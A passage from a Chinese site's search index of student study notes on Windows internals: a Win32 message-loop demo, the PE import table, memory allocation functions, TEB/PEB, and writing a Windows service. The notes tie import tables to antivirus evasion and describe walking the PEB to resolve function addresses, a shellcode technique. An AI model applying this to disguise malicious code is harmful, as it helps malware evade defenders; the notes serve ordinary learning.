IDC_ARROW); wndclass.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH); wndclass.lpszMenuName = NULL; wndclass.lpszClassName = szAppName; if (!RegisterClassEx(&wndclass)) { MessageBox(NULL, TEXT(\"RegisterClassEx failed!\"),TEXT(\"title\"), MB_ICONERROR); return 0; } hwnd = CreateWindowEx(WS_EX_OVERLAPPEDWINDOW, szAppName, TEXT(\"\u7a97\u53e3\u540d\u79f0\"), WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hinstance, NULL); ShowWindow(hwnd, nShowCmd); UpdateWindow(hwnd); while (GetMessage(&msg, hwnd, 0, 0)) { #\u4ece\u6d88\u606f\u961f\u5217\u4e2d\u83b7\u53d6\u6d88\u606f\uff0c\u82e5\u5b58\u5728\u6d88\u606f\u5f85\u5904\u7406\uff0c\u5219\u8fdb\u884c\u7a97\u53e3\u8fc7\u7a0b\u3002\u540c\u65f6\u901a\u8fc7\u53e5\u67c4\u5f97\u5230\u9700\u8981\u6355\u6349\u6d88\u606f\u7684\u5e94\u7528\u7a0b\u5e8f\u3002 TranslateMessage(&msg); DispatchMessage(&msg); } return msg.wParam; } LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) { HDC hdc; PAINTSTRUCT ps; RECT rect; switch (message) { case WM_PAINT: hdc = BeginPaint(hwnd, &ps); GetClientRect(hwnd, &rect); DrawText(hdc, TEXT(\"FUCK\"), -1, &rect, DT_CENTER); EndPaint(hwnd, &ps); return 0; case WM_LBUTTONUP: MessageBox(NULL, TEXT(\"\u8001\u5b50\u88ab\u70b9\u4e86\"), TEXT(\"tick\"), 0); return 0; } return DefWindowProc(hwnd, message, wParam, lParam); } \u5bf9\u4e8e\u6d88\u606f\u673a\u5236\uff0c\u6709\u51e0\u4e2a\u70b9\u9700\u8981\u7279\u522b\u5173\u6ce8\u3002 1.WM_PAINT,WM_TIMER,WM_QUIT \u8fd9\u51e0\u4e2a\u6d88\u606f\u6c38\u8fdc\u88ab\u653e\u5728\u6d88\u606f\u961f\u5217\u6700\u540e\u3002 \u7a76\u5176\u539f\u56e0\u5f88\u7b80\u5355\uff0c\u5c31\u62ffWM_QUIT\u4e3e\u4f8b\uff0c\u4ed6\u662f\u610f\u601d\u662f\u9000\u51fa\uff0c\u82e5\u4e0d\u653e\u5728\u6700\u540e\uff0cWM_QUIT\u540e\u9762\u7684\u6d88\u606f\u4e5f\u5c31\u65e0\u6cd5\u5904\u7406\u4e86\u3002 2.\u4e5f\u6709\u90e8\u5206\u6d88\u606f\u662f\u975e\u961f\u5217\u6d88\u606f\uff0c\u53ef\u4ee5\u65e0\u89c6\u961f\u5217\u987a\u5e8f\u9996\u5148\u88ab\u5904\u7406\u3002","title":"\u6742\u8bb0"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_1","text":"","title":"\u6742\u8bb0"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_2","text":"\u7ed3\u6784\u4f53\u4e0e\u5171\u7528\u4f53 PE\u6587\u4ef6\u4e4b\u5bfc\u5165\u8868 c++\u4e2d\u51e0\u4e2a\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u533a\u522b VirtualAlloc HeapAlloc malloc new TEB PEB \u901a\u8fc7TEB\\&PEB \u52a8\u6001\u83b7\u53d6\u51fd\u6570\u5730\u5740 \u521b\u5efa\u670d\u52a1 \u670d\u52a1 \u5982\u4f55\u521b\u5efa\u4e00\u4e2aWindows\u670d\u52a1 \u670d\u52a1\u7a0b\u5e8f\u4e3b\u51fd\u6570 \u5b8c\u6210\u670d\u52a1\u7a0b\u5e8f\u5185\u5bb9\u4e3b\u51fd\u6570 \u521b\u5efa\u670d\u52a1\u5185\u5bb9\u4e3b\u51fd\u6570 \u5b9e\u73b0 SERVICE_STATUS \u7ed3\u6784 \u5b9e\u73b0\u670d\u52a1\u53e5\u67c4&\u6539\u53d8\u72b6\u6001\u4fe1\u606f DEMO \u542f\u7528SeDebugPrivilege Token PRIVILEGES\u7ed3\u6784\u6811 dll\u7f16\u5199 DLLMAIN DLL \u5bfc\u51fa\u51fd\u6570 \u9898\u5916\u8bdd\uff1a\u600e\u4e48\u4f7f\u7528dll\u6216lib\u4e2d\u7684\u5bfc\u51fa\u51fd\u6570 \u9759\u6001\u94fe\u63a5 \u52a8\u6001\u94fe\u63a5 rundll32 \u6d88\u606f\u673a\u5236 \u4e8b\u4ef6\u9a71\u52a8 \u6d88\u606f\u673a\u5236","title":"\u76ee\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_3","text":"","title":"\u7ed3\u6784\u4f53\u4e0e\u5171\u7528\u4f53"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#pe","text":"\u5bfc\u5165\u8868\u4f5c\u4e3aPE\u6587\u4ef6\u4e2d\u91cd\u8981\u7684\u4e00\u73af\uff0c\u5728\u514d\u6740\u4e2d\u6709\u8bf8\u591a\u5229\u7528\u3002 \u4e00\u4e2a\u5bfc\u5165\u8868\u7684\u7ed3\u6784\u5982\u4e0b \u4e0b\u9762\u53ea\u8bf4\u8bf4\u91cd\u8981\u7684\u9879 OriginalFirstThunk \u6307\u5411\u5bfc\u5165\u540d\u79f0\u8868INT\u7684RVA. Name \u5b58\u50a8\u51fd\u6570\u540d\u5b57\u7684RVA\u3002 FirstThunk \u6307\u5411\u5bfc\u5165\u5730\u5740\u8868IAT\u7684RVA\u3002 OriginalFirstThunk \u548cFirstThunk\u5bf9\u5e94\u7684INT\u548cIAT\u662f\u4e2a\u4ec0\u4e48\u6837\u7684\u6982\u5ff5\u5462\uff1f \u9996\u5148\uff0c\u65e0\u8bba\u662fINT\u8fd8\u662fIAT\uff0c\u5728PE\u6587\u4ef6\u88ab\u52a0\u8f7d\u524d\uff08\u5373\u5728\u6587\u4ef6\u5f62\u5f0f\u65f6\uff09\u90fd\u6307\u5411\u540c\u4e00\u79cd\u7ed3\u6784\uff1aIMAGE_THUNK_DATA,\u5176\u7ed3\u6784\u5982\u4e0b typedef struct _IMAGE_THUNK_DATA32 { union { DWORD ForwarderString; // PBYTE \u6307\u5411\u4e00\u4e2a\u8f6c\u5411\u8005\u5b57\u7b26\u4e32\u7684RVA DWORD Function; // PDWORD \u88ab\u8f93\u5165\u7684\u51fd\u6570\u7684\u5185\u5b58\u5730\u5740 DWORD Ordinal; // \u88ab\u8f93\u5165\u7684 API \u7684\u5e8f\u6570\u503c DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME \u6307\u5411 IMAGE_IMPORT_BY_NAME } u1; } IMAGE_THUNK_DATA32; typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32; \u662f\u4e00\u4e2a\u8054\u5408\u4f53\u7ed3\u6784(\u6240\u4ee5\u53ea\u5360\u56db\u4e2a\u5b57\u8282)\uff0c \u5f53\u6700\u9ad8\u4f4d\u4e3a0\u65f6\uff0c\u5c31\u8bf4\u660e\u8fd9\u56db\u5b57\u8282\u503c\u4e3a IMAGE_IMPORT_BY_NAME \u7684RVA \u5f53\u6700\u9ad8\u4f4d\u4e3a1\u65f6\uff0c\u5219\u53bb\u6389\u6700\u9ad8\u4f4d\u540e\u5269\u4e0b31\u4f4d\u5219\u4e3adll\u51fd\u6570\u5728\u5bfc\u51fa\u8868\u4e2d\u7684\u5bfc\u51fa\u5e8f\u53f7 \u6211\u4eec\u901a\u5e38\u53d6\u5176AddressOfData\u503c\u6765\u83b7\u5f97\u53e6\u4e00\u4e2a\u7ed3\u6784IMAGE_IMPORT_BY_NAME. ypedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; //\u53ef\u80fd\u4e3a0\uff0c\u7f16\u8bd1\u5668\u51b3\u5b9a\uff0c\u5982\u679c\u4e0d\u4e3a0\uff0c\u662f\u51fd\u6570\u5728\u5bfc\u51fa\u8868\u4e2d\u7684\u7d22\u5f15 BYTE Name[1]; //\u51fd\u6570\u540d\u79f0\uff0c\u4ee50\u7ed3\u5c3e\uff0c\u7531\u4e8e\u4e0d\u77e5\u9053\u5230\u5e95\u591a\u957f\uff0c\u6240\u4ee5\u5e72\u8106\u53ea\u7ed9\u51fa\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u627e\u52300\u7ed3\u675f } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; \u4ee5\u4e0a\u5219\u662f\u57fa\u672c\u7684\u7ed3\u6784\uff0c\u4e0b\u9762\u5206\u6790\u5176\u5de5\u4f5c\u7684\u65f6\u5019\u7684\u5b9e\u73b0\u6d41\u7a0b\u3002 \u9996\u5148\u5728\u52a0\u8f7d\u524d\uff0cIAT\u548cINT\u662f\u6307\u5411\u540c\u4e00\u4e2a\u7ed3\u6784IMAGE_THUNK_DATA,\u7684 \u800c\u52a0\u8f7d\u540e\uff0cWindows\u4f1a\u91cd\u5199FirstThunk\u6240\u6307\u5411\u7684INT\u4e2d\u7684\u6bcf\u4e00\u4e2aIMAGE_THUNK_DATA32\uff0c\u4f7f\u5176\u76f4\u63a5\u6307\u5411\u51fd\u6570\u5730\u5740\uff0c\u8fd9\u4e5f\u5c31\u662fIAT\u8f93\u5165\u5730\u5740\u8868\u7684\u540d\u5b57\u7531\u6765\u3002","title":"PE\u6587\u4ef6\u4e4b\u5bfc\u5165\u8868"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#c","text":"","title":"c++\u4e2d\u51e0\u4e2a\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#virtualalloc","text":"\u7528\u6765\u5206\u914d\u5927\u5757\u5185\u5b58\u3002\u4f7f\u7528VirtualFree\u6765\u91ca\u653e","title":"VirtualAlloc"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#heapalloc","text":"\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u4f1a\u5728\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u521b\u5efa1M\u5927\u5c0f\u7684\u5806\uff0c\u53eb\u505a\u9ed8\u8ba4\u5806\u3002HeapAlloc\u7528\u4e8e\u4ece\u5806\u4e0a\u5206\u914d\u5185\u5b58\u5757\u3002 \u5806\u7684\u4f7f\u7528\u53ef\u4ee5\u66f4\u6709\u6548\u5730\u8fdb\u884c\u5185\u5b58\u7ba1\u7406,\u907f\u514d\u7ebf\u7a0b\u540c\u6b65\u7684\u5f00\u9500\u4ee5\u53ca\u5feb\u901f\u91ca\u653e\u5185\u5b58\u3002 \u6b64\u51fd\u6570\u4e00\u822c\u7528\u4e8e\u5206\u914d\u4e00\u822c\u5927\u5c0f\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u5f53\u5206\u914d\u5185\u5b58\u5757\u5927\u4e8e1M\u6700\u597d\u907f\u514d\u4f7f\u7528\u6b64\u51fd\u6570\u3002 \u4f7f\u7528HeapFree\u91ca\u653e","title":"HeapAlloc"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#malloc","text":"C\u5206\u914d\u5185\u5b58\u7684\u65b9\u5f0f\uff0c\u5982\u679c\u60a8\u4f7f\u7528C\u800c\u4e0d\u662fC ++\u7f16\u5199\u4ee3\u7801\uff0c\u5e76\u4e14\u60a8\u5e0c\u671b\u60a8\u7684\u4ee3\u7801\u4e5f\u53ef\u4ee5\u5728Unix\u8ba1\u7b97\u673a\u4e0a\u5de5\u4f5c\uff0c\u6216\u8005\u6709\u4eba\u660e\u786e\u8868\u793a\u9700\u8981\u4f7f\u7528\u5b83\uff0c\u90a3\u4e48\u8bf7\u9009\u62e9\u6b64\u9009\u9879\u3002\u7528free\u89e3\u9664\u5206\u914d\u3002 \u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0cvisual c++\u7684malloc\u8c03\u7528\u4e86HeapAlloc","title":"malloc"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#new","text":"c++\u5206\u914d\u5185\u5b58\u7684\u65b9\u5f0f\u3002\u7528delete\u89e3\u9664\u5206\u914d\u3002","title":"new"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#teb-peb","text":"TEB,\u5373\u7ebf\u7a0b\u73af\u5883\u5757\u3002\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u90fd\u5177\u6709\u4e00\u4e2aTEB\u7ed3\u6784\uff0c\u8bb0\u5f55\u4e86\u76f8\u5173\u7ebf\u7a0b\u7684\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f\u3002 \u7ebf\u7a0b\u8fd0\u884c\u65f6\uff0cFS\u6bb5\u5bc4\u5b58\u5668\u8bb0\u5f55\u4e86\u5176TEB\u7684\u4f4d\u7f6e\uff0cTEB\u7ed3\u6784\u76840x30\u5904\u504f\u79fb\u5373\u4e3aPEB\u8fdb\u7a0b\u73af\u5883\u5feb\u3002 mov eax,fs:[0x30] PEB\u7ed3\u6784\u5f88\u5927\uff0c\u67090x210\u4e2a\u5b57\u8282\u3002","title":"TEB PEB"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#tebpeb","text":"\u5728PEB\u7ed3\u6784\u76840x0c\u504f\u79fb\u5904\uff0c\u662f\u4e00\u4e2a\u6307\u5411PEB_LDR_DATA\u7ed3\u6784\u7684\u6307\u9488\u3002\u8fd9\u4e2a\u7ed3\u6784\u5982\u4e0b\uff1a \u4ed6\u6709\u4e09\u4e2aLIST_ENTRY\u7ed3\u6784\uff0c\u6bcf\u4e00\u4e2a\u90fd\u6309\u7167\u4e0d\u540c\u987a\u5e8f\u5c06\u8fdb\u7a0b\u52a0\u8f7d\u7684\u6240\u6709\u6a21\u5757\u8fde\u63a5\u8d77\u6765\uff0c\u901a\u8fc7\u904d\u5386\u4efb\u610f\u4e00\u4e2aLIST_ENTRY\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97\u6240\u6709\u6a21\u5757\u7684\u57fa\u5730\u5740\uff0c\u83b7\u5f97\u6bcf\u4e2a\u6a21\u5757\u57fa\u5730\u5740\u540e\u901a\u8fc7DLL\u6587\u4ef6\u5bfc\u51fa\u8868\u5c31\u53ef\u4ee5\u83b7\u5f97\u4efb\u4e00\u5bfc\u51fa\u51fd\u6570\u7684\u5730\u5740\u4e86\u3002","title":"\u901a\u8fc7TEB\\&amp;PEB \u52a8\u6001\u83b7\u53d6\u51fd\u6570\u5730\u5740"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_4","text":"","title":"\u521b\u5efa\u670d\u52a1"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_5","text":"Windows\u670d\u52a1\uff0c\u662f\u6307\u8fd0\u884c\u5728windows nt\u64cd\u4f5c\u7cfb\u7edf\u540e\u53f0\u7684\u8ba1\u7b97\u673a\u7a0b\u5e8f. Windows\u670d\u52a1\u5fc5\u987b\u7b26\u5408\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u63a5\u53e3\u89c4\u5219\u548c\u534f\u8bae\uff08SCM)","title":"\u670d\u52a1"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#windows","text":"\u5206\u4e3a\uff1a 1.\u5b8c\u6210\u670d\u52a1\u7a0b\u5e8f\u4e3b\u51fd\u6570\uff08\u8fdb\u7a0b\u5165\u53e3\u70b9\uff08Main\u51fd\u6570 2.\u5b8c\u6210\u670d\u52a1\u7a0b\u5e8f\u5185\u5bb9\u4e3b\u51fd\u6570\uff08ServiceMain 3.\u670d\u52a1\u7684\u6ce8\u518c\u5668\u548c\u5378\u8f7d\u5668","title":"\u5982\u4f55\u521b\u5efa\u4e00\u4e2aWindows\u670d\u52a1"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_6","text":"\u8fd9\u4e2a\u9636\u6bb5\uff0c\u4e3b\u8981\u5e72\u4e24\u4ef6\u4e8b\uff1a 1.\u8bbe\u5b9a\u597dSERVICE_TABLE_ENTRY \u7ed3\u6784\u53d8\u91cf\uff0c\u4f20\u5165\u670d\u52a1\u540d\u548c\u670d\u52a1\u4e3b\u51fd\u6570 2.\u8c03\u7528StartServiceCtrlDispatcher\u51fd\u6570 \u4ee5\u4e0b\u662fSERVICE_TABLE_ENTRY\u7ed3\u6784 typedef struct _SERVICE_TABLE_ENTRYW { LPWSTR lpServiceName; LPSERVICE_MAIN_FUNCTIONW lpServiceProc; }SERVICE_TABLE_ENTRYW, *LPSERVICE_TABLE_ENTRYW; \u6240\u4ee5\u6211\u4eec\u7684\u670d\u52a1\u7a0b\u5e8f\u7684\u4e3b\u51fd\u6570\u53ea\u9700\u8981\u50cf\u8fd9\u6837\u5199\u5373\u53ef int main(){ SERVICE_TABLE_ENTRY Table[] = { {L\"servicename\",ServiceMain},{NULL,NULL} }; StartServiceCtrlDispatcher(Table); } \u5728SERVICE_TABLE_ENTRY\u91cc\u6211\u4eec\u5b9a\u4e49\u597d\u4e86\u4e00\u4e2a\u670d\u52a1\u7684\u540d\u5b57\u4ee5\u53ca\u5176\u5165\u53e3\u51fd\u6570\uff0c\u7136\u540e\u4f7f\u7528StartServiceCtrlDispatcher\u53bb\u8c03\u7528\u8fd9\u4e2a\u7ed3\u6784\u3002 \u7b2c\u4e00\u6b65\u5c31\u662f\u8fd9\u4e48\u7b80\u5355\uff0c\u63a5\u4e0b\u6765\u8ba9\u6211\u4eec\u53bb\u5b9e\u73b0\u670d\u52a1\u7684\u5165\u53e3\u51fd\u6570","title":"\u670d\u52a1\u7a0b\u5e8f\u4e3b\u51fd\u6570"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_7","text":"\u8fd9\u4e00\u6b65\u4e3b\u8981\u8981\u5e72\u8fd9\u51e0\u4e2a\u4e8b\u60c5: 1.\u521b\u5efa\u670d\u52a1\u5185\u5bb9\u4e3b\u51fd\u6570 2\u5728\u670d\u52a1\u5185\u5bb9\u4e3b\u51fd\u6570\u91cc\u5b9e\u73b0 SERVICE_STATUS \u7ed3\u6784\u7684\u586b\u5145\uff0c\u7528\u4e8e\u4e0eSCM\u4ea4\u6d41 3.\u5b9e\u73b0\u670d\u52a1\u53e5\u67c4\uff0c\u5e76\u6839\u636e\u6709\u670d\u52a1\u53e5\u67c4\u6539\u53d8\u72b6\u6001\u4fe1\u606f\uff0c\u4ece\u800c\u5b9e\u73b0SCM\u53d1\u6765\u7684\u63a7\u5236\u8bf7\u6c42 4.\u903b\u8f91","title":"\u5b8c\u6210\u670d\u52a1\u7a0b\u5e8f\u5185\u5bb9\u4e3b\u51fd\u6570"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_8","text":"\u6839\u636e\u6211\u4eec\u5728 SERVICE_TABLE_ENTRY \u7ed3\u6784\u4e2d\u5b9a\u4e49\u7684\u670d\u52a1\u5165\u53e3\u51fd\u6570\uff0c\u521b\u5efa\u5bf9\u5e94\u51fd\u6570 void WINAPI Servicename(DWORD argc, LPTSTR* argv)","title":"\u521b\u5efa\u670d\u52a1\u5185\u5bb9\u4e3b\u51fd\u6570"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#service_status","text":"SERVICE_STATUS \u7ed3\u6784\u5b9a\u4e49\u5982\u4e0b typedef struct _SERVICE_STATUS { DWORD dwServiceType; DWORD dwCurrentState; DWORD dwControlsAccepted; DWORD dwWin32ExitCode; DWORD dwServiceSpecificExitCode; DWORD dwCheckPoint; DWORD dwWaitHint; } SERVICE_STATUS, *LPSERVICE_STATUS; \u6bcf\u4e2a\u9879\u90fd\u5bf9\u5e94\u4e86\u53c2\u6570\u2026\u592a\u591a\u4e86\uff0c\u5efa\u8bae\u53bb\u5b98\u65b9\u6587\u6863\u5bf9\u7167 https://docs.microsoft.com/en-us/windows/win32/api/winsvc/ns-winsvc-service_status dwservicetype \u6307\u5b9a\u4e86\u670d\u52a1\u7684\u7c7b\u578b dwCurrentState \u6307\u5b9a\u670d\u52a1\u5f53\u524d\u7684\u72b6\u6001\uff08\u6302\u8d77\uff0c\u6682\u505c\uff0c\u542f\u52a8\uff0c\u505c\u6b62\u2026) dwControlsAccepted \u6307\u5b9a\u4e86\u670d\u52a1\u53e5\u67c4\u53ef\u4ee5\u63a5\u53d7\u7684\u53c2\u6570 dwWin32ExitCode \u670d\u52a1\u7528\u4e8e\u62a5\u544a\u9519\u8bef\u7684\u9519\u8bef\u4ee3\u7801 dwServiceSpecificExitCode \u670d\u52a1\u7279\u5b9a\u7684\u9519\u8bef\u4ee3\u7801 dwCheckPoint \u4e0d\u592a\u61c2 dwWaitHint \u6302\u8d77\u7684 \u542f\u52a8\uff0c\u505c\u6b62\uff0c\u6682\u505c\u6216\u7ee7\u7eed\u64cd\u4f5c\u6240\u9700\u7684\u4f30\u8ba1\u65f6\u95f4\uff0c\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d \u3002\u82e5\u6307\u5b9a\u65f6\u95f4\u5df2\u8fc7\u53bb\u800cdwCheckPoint\u672a\u589e\u52a0\u6216\u8005dwCurrentState\u5c1a\u672a\u66f4\u6539\uff0c\u5219\u4e2d\u6b62\u670d\u52a1\u3002 \u603b\u800c\u8a00\u4e4b\uff0c\u5c31\u662f\u521b\u5efa\u4e00\u4e2a\u7ed3\u6784\u7528\u4e8e\u6536\u96c6\u670d\u52a1\u7684\u5404\u4e2a\u4fe1\u606f","title":"\u5b9e\u73b0 SERVICE_STATUS \u7ed3\u6784"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_9","text":"\u5b9e\u73b0\u670d\u52a1\u53e5\u67c4\u4e3b\u8981\u662f\u4f9d\u9760RegisterServiceCtrlHandlerA\u51fd\u6570\u5b9e\u73b0\u7684\u3002 \u8fd9\u4e2a\u51fd\u6570\u7684\u4f5c\u7528\u662f\u6ce8\u518c\u4e00\u4e2a\u51fd\u6570\u6765\u5904\u7406\u6307\u5b9a\u670d\u52a1\u63a7\u5236\u8bf7\u6c42\u3002 \u8fd9\u4e2a\u51fd\u6570\u7684\u7ed3\u6784\u662f\u8fd9\u6837 SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerA( LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc ); lpservicename\u662f\u6307\u5b9a\u670d\u52a1\u540d,lphandlerproc\u662f\u88ab\u6ce8\u518c\u7684\u51fd\u6570\u3002\u6240\u4ee5\u6211\u4eec\u8981\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u6765\u6ce8\u518c\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u9996\u5148\u8981\u5b8c\u6210\u88ab\u6ce8\u518c\u51fd\u6570\u7684\u5185\u90e8\u903b\u8f91\u3002\u8fd9\u91cc\u505a\u4e2a\u8303\u4f8b void WINAPI ctrl(DWORD Opcode) //\u5b9a\u4e49\u5f0f\u56fa\u5b9a { switch (Opcode) { case SERVICE_CONTROL_PAUSE: m_ServiceStatus.dwCurrentState = SERVICE_PAUSED; break; case SERVICE_CONTROL_CONTINUE: m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; break; case SERVICE_CONTROL_STOP: m_ServiceStatus.dwWin32ExitCode = 0; m_ServiceStatus.dwCurrentState = SERVICE_STOPPED; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus); bRunning = false; break; case SERVICE_CONTROL_INTERROGATE: break; } return; } \u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u51fd\u6570\u4f1a\u6839\u636e\u4f20\u5165\u7684\u503c\u6539\u53d8 SERVICE_STATUS \u7ed3\u6784\u3002 \u82e5\u628a\u4ed6\u6ce8\u518c\uff0c\u90a3\u4e48\u4ece\u670d\u52a1\u7ba1\u7406\u63a7\u5236\u5668\u53d1\u6765\u7684\u63a7\u5236\u6307\u4ee4\u4f1a\u88ab\u5f53\u4f5c\u53c2\u6570\u4f20\u5165\u8be5\u51fd\u6570\uff0c\u7136\u540e\u8be5\u51fd\u6570\u4f1a\u4fee\u6539 SERVICE_STATUS \u3002 \u90a3\u4e48\u6539\u53d8\u72b6\u6001\u4fe1\u606f\u7684\u51fd\u6570\u4e3b\u8981\u5c31\u662fSetServiceStatus \u4e86 BOOL SetServiceStatus( SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus ); hservicestatus \u6307\u5411\u670d\u52a1\u53e5\u67c4 lpservicestatus \u6307\u5411 SERVICE_STATUS \u7ed3\u6784\u3002 \u5b8c\u6210\u8fd9\u4e2a\u51fd\u6570\u540e\uff0c\u670d\u52a1\u5c31\u4f1a\u5411\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u53d1\u9001\u81ea\u5df1\u6700\u65b0\u7684\u72b6\u6001\u4fe1\u606f\uff08\u5373 SERVICE_STATUS 